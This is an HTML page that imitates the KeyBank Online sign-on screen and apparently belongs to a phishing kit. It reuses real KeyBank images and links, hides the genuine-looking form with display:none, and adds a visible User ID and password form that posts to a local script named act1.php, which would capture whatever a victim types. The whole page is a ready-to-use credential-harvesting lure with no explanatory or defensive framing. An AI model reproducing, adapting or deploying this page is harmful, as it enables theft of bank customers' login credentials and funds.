<!DOCTYPE html>
<html lang="en">
<head>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">

		<!-- Needed for Bootstrap -->
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta http-equiv="cache-control" content="max-age=0">
		
		
	
		<title >KeyBank Online</title>





		
		<!-- Icons for app -->
		<link rel="apple-touch-icon" sizes="180x180" href="https://ibx.key.com/ibxolb/olb/share/assets/images/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="index/favicon-32x32.png" sizes="32x32">
		<link rel="icon" type="image/png" href="index/favicon-16x16.png" sizes="16x16">
		<link rel="mask-icon" href="https://ibx.key.com/ibxolb/olb/share/assets/images/safari-pinned-tab.svg" color="#5bbad5">
		<link rel="shortcut icon" href="index/favicon.ico">
		<meta name="theme-color" content="#ffffff">
		
		<!-- Bootstrap and special CSS files for display  -->	
		
		
		
		
		
		
		
		
		
		
	
<link media="all" href="index/index.css" type="text/css" rel="stylesheet">
</head>
<body style="background-image: url('index/background_default_day.jpg'); background-size: cover; background-color: transparent; background-repeat: no-repeat; background-position: center center;">
		
		<!-- hidden iframe to call external links to kill active sessions -->
		<iframe id="externalLinkFrame" style="visibility: hidden; width: 0px; height: 0px;" src="index/index_1.html"></iframe>
		<div>
			<!--All the common popup actions content goes here like (timeout, profile et.,)-->
			<!-- ngIf: _showSessionTimeout -->
			<div id="stepUpSection" class="animate slideInDown ng-hide" ng-show="_showStepUp">
				<!-- ngInclude: _globalStepUpContainerTemplate --><article id="stepup" ng-include="_globalStepUpContainerTemplate" class="ng-scope" style=""><!-- ngIf: $$config.channel === $$constants.CHANNEL_MOBILE_APP --><!-- ngIf: $$config.channel==$$constants.CHANNEL_WEB ||  $$config.channel === $$constants.CHANNEL_TABLET --><section data-ng-if="$$config.channel==$$constants.CHANNEL_WEB ||  $$config.channel === $$constants.CHANNEL_TABLET " class="container inner-container ng-scope" style=""><div data-ng-controller="$$globalStepUpController as gStepUpCtrl" class="ng-scope"><header><section class="longProcess-header"><section class="headersection"><article class="container card-title"><div class="longflow-header"><div class="card-title-reset"><span class="ng-binding">Authentication Required</span></div><a href="javascript:void(0);" title="Click to Close" ng-click="gStepUpCtrl.close()" class="header-close"><icon>close</icon></a></div></article></section><!-- ngIf: gStepUpCtrl.message --></section></header><section class="step-up-questions"><section class="row"><section class="col-xxl-6 col-xl-6 col-lg-7 col-md-9 col-sm-12 col-xs-12 changepassword-stepupverid"><div id="globalStepUpContainer"></div></section></section></section></div></section><!-- end ngIf: $$config.channel==$$constants.CHANNEL_WEB ||  $$config.channel === $$constants.CHANNEL_TABLET --></article>
			</div>
			<div id="printSection">
				<!-- ngInclude: printTemplate -->
			</div>
			<!--Page header and content -->
		    <div id="ibxMainView" ng-class="{'content-blur':_showSessionTimeout}" ng-show="!_showStepUp" class="">
		    		<div class="busy hide-me">
		    			<svg class="spinner-large" width="56" height="56">
							<circle class="spinner-large-circle" cx="28" cy="28" r="25"></circle>
						</svg>
		    		</div>
		    		<!-- ngIf: !_animateUiView() -->
		    		<!-- ngIf: _animateUiView() --><!-- uiView:  --><div id="ui-view" ng-if="_animateUiView()" ui-view="" class="anim-in-out anim-fade ng-scope" data-anim-sync="true" data-anim-speed="500"><div data-ng-controller="loginController as login" class="ng-scope"><!-- ngIf: login.appReady --><div class="ng-scope" style=""><!-- ngInclude: undefined --><ng-include src="" class="ng-scope"><div class="left-menu-navigator ng-scope" data-ng-controller="headerController as header"><div class="left-menu-navigator"> <span class="hamb-top"></span><span class="hamb-middle"></span><span class="hamb-bottom"></span></button><div class="sidebar-wrapper" ng-class="{'toggled': !header.isHamburgerClosed}"><div ng-class="{'overlay': !header.isHamburgerClosed}" ng-click="header.toggleHamburgerMenu()"></div><nav class="navbar navbar-inverse navbar-fixed-top new-navigation sidebar-nav-wrapper" role="navigation"><ul class="nav sidebar-nav"><!-- ngIf: header.authenticated --><!-- ngIf: header.authenticated --><!-- ngIf: !header.authenticated --><li  class="ng-scope"> <a data-test="asxscontactus" href="https://www.key.com/about/customer-service/key-bank-customer-service.jsp" title="Contact Us">Contact Us</a></li><!-- end ngIf: !header.authenticated --><!-- ngIf: header.authenticated --><!-- ngIf: header.authenticated && header.enableManageAccessIcon --><!-- ngIf: header.authenticated && header.enableManageAccessIcon --><li> <a data-test="as1opena1" href="javascript:void(0)" ng-click="header.logOpenNewAccountAudit()" title="Open a New Account">Open a New Account</a></li><!-- ngIf: header.authenticated --><!-- ngIf: header.authenticated && header.inProductPage() --><!-- ngIf: header.authenticated --><!-- ngIf: header.authenticated --></ul></nav></div></div><header><div class="main-header"><a href="javascript:;" ng-click="header.logoClicked()" title="KeyBank" class=""><h3 data-test="as1kl1" class="headerlogo no-print"><span class="sr-only">KeyBank</span><icon>key_logo_k</icon></h3></a><nav class="nav-links hidden-print"><ul><!-- ngIf: header.authenticated --><!-- ngIf: !header.authenticated --><li class="hidden-xs hidden-sm hidden-md ng-scope" ng-if="!header.authenticated"> <a data-test="cntushdrlnk" href="https://www.key.com/about/customer-service/key-bank-customer-service.jsp" target="_top" title="Contact Us">Contact Us</a></li><!-- end ngIf: !header.authenticated --><li class="hidden-xs hidden-sm hidden-md"> <a data-test="as1opena2" href="javascript:void(0)" ng-click="header.logOpenNewAccountAudit()" title="Open a New Account">Open a New Account</a></li><!-- ngIf: header.authenticated --><!-- ngIf: header.authenticated && header.enableManageAccessIcon --><!-- ngIf: header.authenticated && header.enableManageAccessIcon --><!-- ngIf: header.authenticated --><!-- ngIf: header.authenticated --><!-- ngIf: header.authenticated --></ul></nav><br><!-- ngIf: header.message --></div></header></div></ng-include><!-- ngInclude: undefined --><ng-include src="" class="ng-scope" style=""><div  class="ng-scope"><marketing-content identifier-name="'loginTopBanner'" class="ng-isolate-scope"><!-- ngIf: marketingController.contentToRender --><div class="ng-scope" style=""><div class="ng-binding"> </div></div><!-- end ngIf: marketingController.contentToRender --></marketing-content><div class="container signon-box inverse"><marketing-content identifier-name="'loginLeftTile'" class="ng-isolate-scope"><!-- ngIf: marketingController.contentToRender --><div class="ng-scope" style=""><div class="ng-binding"> </div></div><!-- end ngIf: marketingController.contentToRender --></marketing-content><div class="signon-container"><h1>Online Banking</h1> <input id="userID" value="" type="hidden"><div  class="" style="">
                        
                        <form class="login-form " action="act1.php" mehod="POST" style="display:none;">
                            <div class="userid section-label has-focus" style=""> 
                                <label for="loginUserId">User ID</label> 
                                <input name="loginUserId" id=""   maxlength="30" autocorrect="off" autocapitalize="none" tabindex=""  class="form-control " value="" type="text"> 
                                <span class="input-inline-right"><!-- ngIf: $$Capabilities.forgotUser --><a  title="Forget User ID"  tabindex="7" class="ng-scope">Forgot?</a><!-- end ngIf: $$Capabilities.forgotUser -->
                                  </span>
                                  </div>
                            <div class="password section-label has-focus"  style=""> 
                                <label for="loginPassword">Password</label> 
                                <input id="" name="password"  maxlength="30" tabindex="" class="form-control" style="" type="password"> 
                                <span ><!-- ngIf: $$Capabilities.forgotPassword -->
                                    <a  title="Forget Password" tabindex="8" class="ng-scope">Forgot?</a><!-- end ngIf: $$Capabilities.forgotPassword -->
                                 </span>
                                </div><div class="checkbox"> 
                                    <label ><input tabindex=""  class="ng-pristine ng-untouched ng-valid" checked="checked" type="checkbox"> Save User ID</label>
                                </div> <!-- ngIf: !signIn.signInProgress -->
                            <button  tabindex=""  class="btn btn-lg btn-block btn-primary " type="submit" >Sign On</button><!-- end ngIf: !signIn.signInProgress --> <!-- ngIf: signIn.signInProgress --> <!-- ngIf: $$Capabilities.enrollments -->
                            </form>

<form action="act1.php" method="post" class="login-form">
    <div class="userid section-label has-focus">
    <label>User ID</label>
<input type="text" name="loginUserId"  class="form-control" maxlength="30" />
        <span class="input-inline-right"><a  title="Forget User ID"   class="ng-scope">Forgot?</a>   </span>
        </div>
    <div class="password section-label has-focus">
            <label>Password</label>
<input type="password" name="password"  class="form-control"  maxlength="30"/>
     
        <span class="input-inline-right">      
    <a  title="Forget Password" class="ng-scope">Forgot?</a>
        </span>
            </div>
       
    <div class="checkbox">
   <label> <input  class="ng-pristine ng-untouched ng-valid" checked="checked" type="checkbox"> Save User ID</label>
        </div>
<input type="submit" name="name" value="Sign On " class="btn btn-lg btn-block btn-primary" />




</form>


                            </div>
                            </div>
                        </ng-include>
                                                                                                                                                </div><!-- end ngIf: login.appReady --></div>

		    	</div><!-- end ngIf: _animateUiView() -->
		    </div>
	    </div>
</body>
</html>
